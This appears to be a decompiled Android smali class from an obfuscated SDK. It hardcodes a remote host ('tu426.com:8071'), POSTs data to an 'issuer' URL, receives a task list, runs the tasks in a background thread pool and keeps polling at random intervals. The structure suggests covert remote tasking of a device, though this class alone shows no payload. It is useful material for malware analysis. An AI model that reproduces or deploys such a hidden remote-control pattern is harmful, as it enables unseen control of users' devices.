.class public final Lcom/e/a/a;
.super Ljava/lang/Thread;


# static fields
.field static a:I = 0x0

.field static b:Ljava/lang/String; = "tu426.com:8071"

.field static c:Ljava/lang/String;

.field static d:Ljava/lang/String;

.field static volatile e:Ljava/lang/String;

.field private static volatile f:Ljava/lang/String;

.field private static volatile g:Ljava/lang/String;

.field private static volatile h:Landroid/content/Context;

.field private static volatile i:Ljava/lang/String;

.field private static volatile j:Lcom/e/a/b;


# direct methods
.method static constructor <clinit>()V
    .locals 6

    const/4 v0, 0x2

    new-array v1, v0, [Ljava/lang/Object;

    sget-object v2, Lcom/e/a/a;->b:Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const/4 v2, 0x1

    const-string v4, "6.2.0"

    aput-object v4, v1, v2

    const-string v5, "http://issuer.%s/%s/1510864978/1"

    invoke-static {v5, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/e/a/a;->c:Ljava/lang/String;

    new-array v0, v0, [Ljava/lang/Object;

    sget-object v1, Lcom/e/a/a;->b:Ljava/lang/String;

    aput-object v1, v0, v3

    aput-object v4, v0, v2

    const-string v1, "http://receiver.%s/%s/163832107/2"

    invoke-static {v1, v0}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/e/a/a;->d:Ljava/lang/String;

    const-string v0, "CHANNEL_ID"

    sput-object v0, Lcom/e/a/a;->e:Ljava/lang/String;

    new-instance v0, Lcom/e/a/b;

    invoke-direct {v0}, Lcom/e/a/b;-><init>()V

    sput-object v0, Lcom/e/a/a;->j:Lcom/e/a/b;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Z)I
    .locals 3

    const-class p3, Lcom/e/a/a;

    const/4 v0, 0x1

    :try_start_0
    monitor-enter p3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    sget-object v1, Lcom/e/a/a;->h:Landroid/content/Context;

    const/4 v2, 0x0

    if-eqz v1, :cond_1

    sget-object v1, Lcom/e/a/a;->g:Ljava/lang/String;

    if-eqz v1, :cond_1

    sget-object v1, Lcom/e/a/a;->f:Ljava/lang/String;

    if-nez v1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    sput-object p0, Lcom/e/a/a;->h:Landroid/content/Context;

    sput-object p1, Lcom/e/a/a;->g:Ljava/lang/String;

    sput-object p2, Lcom/e/a/a;->f:Ljava/lang/String;

    const/4 p0, 0x1

    :goto_1
    monitor-exit p3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-nez p0, :cond_2

    return v2

    :cond_2
    :try_start_2
    sget-object p0, Lcom/e/a/a;->h:Landroid/content/Context;

    invoke-static {p0}, Lcom/e/a/a;->a(Landroid/content/Context;)Z

    move-result p0

    if-nez p0, :cond_3

    return v2

    :cond_3
    sget-object p0, Lcom/e/a/a;->f:Ljava/lang/String;

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result p0

    const/16 p1, 0x20

    if-ne p0, p1, :cond_4

    sget-object p0, Lcom/e/a/a;->g:Ljava/lang/String;

    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object p0

    invoke-static {p0}, Lcom/e/a/f;->c([B)[B

    move-result-object p0

    invoke-static {p0}, Lcom/e/a/g;->a([B)Ljava/lang/String;

    move-result-object p0

    sget-object p1, Lcom/e/a/a;->g:Ljava/lang/String;

    invoke-virtual {p0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object p0

    invoke-static {p0}, Lcom/e/a/f;->c([B)[B

    move-result-object p0

    invoke-static {p0}, Lcom/e/a/g;->a([B)Ljava/lang/String;

    move-result-object p0

    const/4 p1, 0x2

    const/16 p2, 0x1e

    invoke-virtual {p0, p1, p2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p0

    sget-object p1, Lcom/e/a/a;->f:Ljava/lang/String;

    const/16 p2, 0x1c

    invoke-virtual {p1, v2, p2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result p0

    if-eqz p0, :cond_4

    sget-object p0, Lcom/e/a/a;->f:Ljava/lang/String;

    invoke-virtual {p0, p2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p0

    const/16 p1, 0x10

    invoke-static {p0, p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/e/a/a;->e:Ljava/lang/String;

    sget-object p0, Lcom/e/a/a;->h:Landroid/content/Context;

    invoke-static {p0}, Lcom/e/a/d;->a(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    new-instance p0, Lcom/e/a/a;

    invoke-direct {p0}, Lcom/e/a/a;-><init>()V

    invoke-virtual {p0}, Lcom/e/a/a;->start()V

    return v2

    :cond_4
    return v0

    :catchall_0
    move-exception p0

    :try_start_3
    monitor-exit p3
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :try_start_4
    throw p0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    :catch_0
    move-exception p0

    return v0
.end method

.method static a()Landroid/content/Context;
    .locals 1

    sget-object v0, Lcom/e/a/a;->h:Landroid/content/Context;

    return-object v0
.end method

.method private static a(Landroid/content/Context;)Z
    .locals 5

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    const-string v1, "activity"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    invoke-virtual {v1}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/ActivityManager$RunningAppProcessInfo;

    iget-object v3, v2, Landroid/app/ActivityManager$RunningAppProcessInfo;->processName:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    :try_start_0
    iget v3, v2, Landroid/app/ActivityManager$RunningAppProcessInfo;->pid:I

    invoke-static {p0}, Lcom/e/a/c;->a(Landroid/content/Context;)I

    move-result v4

    if-eq v3, v4, :cond_0

    iget v0, v2, Landroid/app/ActivityManager$RunningAppProcessInfo;->pid:I

    invoke-static {p0, v0}, Lcom/e/a/c;->a(Landroid/content/Context;I)V
    :try_end_0
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p0, 0x1

    return p0

    :catch_0
    move-exception p0

    goto :goto_0

    :catch_1
    move-exception p0

    :cond_1
    :goto_0
    const/4 p0, 0x0

    return p0
.end method

.method static b()V
    .locals 2

    invoke-static {}, Lcom/e/a/b;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/e/a/c;

    invoke-virtual {v1}, Lcom/e/a/c;->a()Z

    goto :goto_0

    :cond_0
    sget-object v0, Lcom/e/a/a;->h:Landroid/content/Context;

    const-string v1, "6901029832"

    invoke-virtual {v0, v1}, Landroid/content/Context;->deleteFile(Ljava/lang/String;)Z

    invoke-static {}, Lcom/e/a/d;->a()V

    return-void
.end method

.method private static c()Ljava/util/HashMap;
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/HashMap<",
            "Ljava/lang/Integer;",
            "Lcom/e/a/c;",
            ">;"
        }
    .end annotation

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    new-instance v1, Lcom/e/a/d;

    const/16 v2, -0x2b

    invoke-direct {v1, v2}, Lcom/e/a/d;-><init>(B)V

    invoke-static {}, Lcom/e/a/b;->b()[B

    move-result-object v3

    invoke-virtual {v1, v3}, Lcom/e/a/d;->a([B)V

    new-instance v3, Lcom/e/a/t;

    sget-object v4, Lcom/e/a/a;->c:Ljava/lang/String;

    invoke-virtual {v1}, Lcom/e/a/d;->b()[B

    move-result-object v1

    const-string v5, "POST"

    const/4 v6, 0x1

    invoke-static {v4, v5, v1, v6}, Lcom/e/a/g;->a(Ljava/lang/String;Ljava/lang/String;[BZ)[B

    move-result-object v1

    invoke-direct {v3, v1}, Lcom/e/a/t;-><init>([B)V

    invoke-virtual {v3}, Lcom/e/a/t;->b()B

    move-result v1

    if-ne v1, v2, :cond_0

    invoke-virtual {v3}, Lcom/e/a/t;->a()Z

    move-result v1

    if-eqz v1, :cond_0

    :try_start_0
    invoke-virtual {v3}, Lcom/e/a/t;->c()[B

    move-result-object v1

    invoke-static {v1}, Lcom/e/a/b;->a([B)Ljava/util/HashMap;

    move-result-object v0

    invoke-static {v0}, Lcom/e/a/b;->a(Ljava/util/HashMap;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_0

    invoke-static {v1}, Lcom/e/a/b;->a(Ljava/util/List;)V
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    :cond_0
    :goto_0
    return-object v0
.end method


# virtual methods
.method public final run()V
    .locals 6

    :try_start_0
    sget-object v0, Lcom/e/a/a;->h:Landroid/content/Context;

    invoke-static {v0}, Lcom/e/a/o;->a(Landroid/content/Context;)I

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/e/a/a;->c()Ljava/util/HashMap;

    move-result-object v0

    invoke-static {}, Lcom/e/a/b;->a()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    invoke-static {v2}, Ljava/util/concurrent/Executors;->newScheduledThreadPool(I)Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v2

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/e/a/c;

    iget v4, v3, Lcom/e/a/c;->a:I

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/e/a/c;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    new-instance v5, Lcom/e/a/a$1;

    invoke-direct {v5, v4, v3}, Lcom/e/a/a$1;-><init>(Lcom/e/a/c;Lcom/e/a/c;)V

    invoke-interface {v2, v5}, Ljava/util/concurrent/ScheduledExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v3

    goto :goto_0

    :cond_1
    :try_start_2
    invoke-interface {v2}, Ljava/util/concurrent/ScheduledExecutorService;->shutdown()V

    invoke-static {}, Lcom/e/a/g;->c()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/e/a/a;->i:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :cond_2
    :goto_1
    :try_start_3
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/16 v1, 0x1cc

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v0, v0, 0x3c

    mul-int/lit16 v0, v0, 0x3e8

    int-to-long v0, v0

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {}, Lcom/e/a/g;->c()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/e/a/a;->i:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v0

    if-lez v0, :cond_2

    sget-object v0, Lcom/e/a/a;->h:Landroid/content/Context;

    invoke-static {v0}, Lcom/e/a/o;->a(Landroid/content/Context;)I

    move-result v0

    if-nez v0, :cond_2

    invoke-static {}, Lcom/e/a/g;->c()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/e/a/a;->i:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_1

    :catch_2
    move-exception v0

    return-void
.end method
